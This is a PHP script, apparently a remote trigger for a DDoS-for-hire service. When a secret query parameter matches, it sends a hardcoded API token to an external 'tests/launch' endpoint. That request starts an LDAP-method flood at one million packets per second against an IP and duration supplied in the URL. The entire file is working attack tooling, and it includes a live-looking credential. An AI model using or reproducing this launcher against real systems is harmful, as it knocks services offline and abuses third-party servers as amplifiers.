<?php

if (!isset($_GET["negro"]) || strcmp($_GET["negro"], "adofzsAFÖ986aeöfiohASGÖ98ZSragpéoihSRÖHG8ZEDSARÖO97GUERÖOP98HZ2ewgtr4uh8zi2qwt4jum9w222p9üu23qwtrz45g2w4rjum31qgtvz4eu9ü1qöuh98zi") !== 0) {
    die();
}

$base_url = "https://api.sleek.to/tests/launch";
$curl = curl_init();

curl_setopt_array($curl, array(
    CURLOPT_URL => $base_url,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => array(
        "token" => "WeLgw1O2L0E4Z4",
        "target" => $_GET["ip"],
        "port" => "80",
        "duration" => $_GET["time"],
        "method" => "LDAP",
        "pps" => "1000000"
    )
));

$response = curl_exec($curl);
curl_close($curl);

?>